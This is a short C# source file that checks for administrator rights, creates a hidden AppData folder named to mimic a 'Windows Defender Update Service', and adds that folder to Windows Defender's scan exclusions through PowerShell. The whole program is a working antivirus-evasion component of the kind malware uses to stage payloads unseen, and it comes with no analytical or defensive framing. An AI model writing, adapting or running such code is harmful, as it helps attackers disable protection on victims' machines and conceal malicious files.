using System;
using System.Diagnostics;
using System.IO;

namespace WD_Exclusion
{
    class Program
    {
        static void Main(string[] args)
        {
            bool checkAdmin;

            string exclusionpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows Defender Update Service\\";

            Process compiler = new Process();
            compiler.StartInfo.FileName = "powershell.exe";
            compiler.StartInfo.Verb = "prunas";
            compiler.StartInfo.Arguments = @"[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match 'S-1-5-32-544')";
            compiler.StartInfo.UseShellExecute = false;
            compiler.StartInfo.RedirectStandardOutput = true;
            compiler.Start();
            checkAdmin = bool.Parse(compiler.StandardOutput.ReadToEnd());
            compiler.WaitForExit();

            if (checkAdmin == true)
            {
                if (!Directory.Exists(exclusionpath))
                {
                    DirectoryInfo di = Directory.CreateDirectory(exclusionpath);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                }
                compiler.StartInfo.Arguments = @"Add-MpPreference -ExclusionPath '" + exclusionpath + "'";
                compiler.Start();
                Console.WriteLine("Exclusion path has been added.");
            }
            else if (checkAdmin == false)
            {
                Console.WriteLine("Error getting admin privileges.");
            }
            else
            {
                Console.WriteLine("An unkown error occurred.");
            }
            compiler.WaitForExit();
            Console.ReadLine();
        }
    }
}
